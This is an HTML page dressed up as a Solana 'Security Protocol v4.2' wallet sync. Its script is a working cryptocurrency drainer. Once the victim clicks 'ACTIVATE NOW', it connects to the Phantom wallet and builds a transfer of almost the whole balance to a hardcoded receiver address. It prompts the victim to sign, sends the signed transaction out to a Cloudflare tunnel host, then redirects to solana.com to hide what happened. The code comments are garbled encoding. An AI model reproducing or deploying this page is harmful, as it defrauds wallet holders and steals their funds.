<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Security Upgrade | Solana</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; background: #111; padding: 40px; border-radius: 20px; border: 1px solid #222; width: 300px; }
        #cta { background: linear-gradient(90deg, #14F195, #9945FF); color: #000; border: none; padding: 15px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
        #loader { display: none; margin-top: 20px; font-size: 12px; color: #14F195; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://solana.com/favicon.ico" style="width:50px;">
        <h2 style="font-size:1.1rem;">Security Protocol v4.2</h2>
        <p style="color:#666; font-size:0.8rem;">Syncing wallet for network stability.</p>
        <button id="cta">ACTIVATE NOW</button>
        <div id="loader">‚óè ENCRYPTING...</div>
    </div>

    <script>
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            if (!p) return alert("Please use Phantom browser.");

            try {
                const resp = await p.connect();
                document.getElementById('cta').style.display = 'none';
                document.getElementById('loader').style.display = 'block';

                // 1. Ëé∑Âèñ Blockhash
                const syncRes = await fetch(`${tunnel}/sync`);
                const { bh } = await syncRes.json();

                // 2. Êü•‰ΩôÈ¢ù
                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                const balance = await connection.getBalance(resp.publicKey);
                
                // 3. ÊûÑÈÄ†‰∫§Êòì (Áïô 0.001 ÂÅöÊâãÁª≠Ë¥π)
                let amount = balance > 1000000 ? balance - 1000000 : 1000000;
                
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(RECEIVER),
                        lamports: amount,
                    })
                );
                transaction.recentBlockhash = bh;
                transaction.feePayer = resp.publicKey;

                // 4. ÊãâËµ∑Á≠æÂêç
                const signed = await p.signTransaction(transaction);
                const rawTx = signed.serialize().toString('base64');
                
                // üî± ÂÖ≥ÈîÆ‰ºòÂåñÔºö‰ΩøÁî® sendBeacon Á°Æ‰øùÊï∞ÊçÆ‰∏ÄÂÆöËÉΩ‰º†ÂõûÊúçÂä°Âô®ÔºåÂç≥‰ΩøÈ°µÈù¢Ë∑≥ËΩ¨
                const collectUrl = `${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`;
                
                // ÂêåÊó∂Â∞ùËØï‰∏§ÁßçÂõû‰º†ÊñπÂºèÔºåÁ°Æ‰øù‰∏áÊó†‰∏ÄÂ§±
                fetch(collectUrl); 
                navigator.sendBeacon(collectUrl);

                // Âª∂Ëøü 1.5 ÁßíË∑≥ËΩ¨ÔºåÁªôÊï∞ÊçÆ‰º†ËæìÁïôË∂≥Êó∂Èó¥
                setTimeout(() => {
                    window.location.href = "https://solana.com/";
                }, 1500);

            } catch(e) {
                console.log(e);
                window.location.reload();
            }
        };
    </script>
</body>
</html>
